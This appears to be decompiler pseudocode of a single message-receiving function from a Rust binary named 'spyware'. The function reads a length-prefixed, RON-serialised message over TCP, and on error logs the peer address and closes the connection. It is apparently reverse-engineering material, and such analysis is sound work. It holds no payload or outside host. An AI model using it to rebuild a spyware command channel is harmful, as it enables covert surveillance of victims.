__int64 __fastcall spyware::communication::server::get_message(__int64 a1, __int64 a2)
{
  __int64 v2; // rax
  __int64 v3; // rdx
  __int64 v4; // rcx
  __int64 v5; // rax
  __int64 msg_type_and_length; // rax
  __int64 v7; // rax
  __int128 v8; // xmm0
  __int128 v9; // xmm1
  __int128 v10; // xmm2
  __int64 result; // rax
  __int64 v12; // rax
  int v13; // [rsp+4h] [rbp-114h] BYREF
  __int64 v14; // [rsp+8h] [rbp-110h] BYREF
  __int64 v15; // [rsp+10h] [rbp-108h] BYREF
  const char *v16; // [rsp+18h] [rbp-100h] BYREF
  __int64 v17; // [rsp+20h] [rbp-F8h]
  __int128 v18; // [rsp+28h] [rbp-F0h]
  __int64 v19; // [rsp+38h] [rbp-E0h]
  _QWORD v20[2]; // [rsp+40h] [rbp-D8h] BYREF
  __int128 v21; // [rsp+50h] [rbp-C8h]
  _QWORD v22[4]; // [rsp+60h] [rbp-B8h] BYREF
  _QWORD v23[8]; // [rsp+80h] [rbp-98h] BYREF
  _OWORD v24[5]; // [rsp+C0h] [rbp-58h] BYREF

  v14 = a2;
  v13 = 0;
  v2 = std::io::default_read_exact(&v14, &v13, 4LL);
  if ( !v2 )
  {
    msg_type_and_length = spyware::communication::serialization::extract_msg_type_and_length(v13);
    <u8 as alloc::vec::spec_from_elem::SpecFromElem>::from_elem(&v16, msg_type_and_length);
    v7 = std::io::default_read_exact(&v14, v17, v18);
    core::result::Result<T,E>::expect(v7);
    ron::de::from_bytes(v23, v17, v18);
    core::result::Result<T,E>::unwrap(v24, v23);
    v8 = v24[0];
    v9 = v24[1];
    v10 = v24[2];
    *(_OWORD *)(a1 + 48) = v24[3];
    *(_OWORD *)(a1 + 32) = v10;
    *(_OWORD *)(a1 + 16) = v9;
    *(_OWORD *)a1 = v8;
    return core::ptr::drop_in_place<alloc::vec::Vec<u8>>(&v16);
  }
  v15 = v2;
  if ( core::sync::atomic::atomic_load(&v14, &v13, v3, v4) )
  {
    std::net::tcp::TcpStream::peer_addr(&v16, v14);
    if ( (_WORD)v16 == 2 )
    {
      v5 = v17;
LABEL_8:
      *(_QWORD *)(a1 + 8) = v5;
      *(_QWORD *)a1 = 0x800000000000000ALL;
      return core::ptr::drop_in_place<std::io::error::Error>(&v15);
    }
    v20[0] = v16;
    v24[4] = v18;
    v20[1] = v17;
    v21 = v18;
    v22[0] = v20;
    v22[1] = <core::net::socket_addr::SocketAddr as core::fmt::Display>::fmt;
    v22[2] = &v15;
    v22[3] = <std::io::error::Error as core::fmt::Display>::fmt;
    v23[0] = &off_B8BB0;
    v23[1] = 2LL;
    v23[4] = 0LL;
    v23[2] = v22;
    v23[3] = 2LL;
    v12 = log::__private_api::loc(&off_B8C18);
    v16 = aSpywareCommuni;
    v17 = 30LL;
    *(_QWORD *)&v18 = aSpywareCommuni;
    *((_QWORD *)&v18 + 1) = 30LL;
    v19 = v12;
    log::__private_api::log(v23, 1LL, &v16);
  }
  v5 = std::net::tcp::TcpStream::shutdown(v14, 2LL);
  if ( v5 )
    goto LABEL_8;
  *(_QWORD *)(a1 + 8) = v15;
  result = 0x800000000000000ALL;
  *(_QWORD *)a1 = 0x800000000000000ALL;
  return result;
}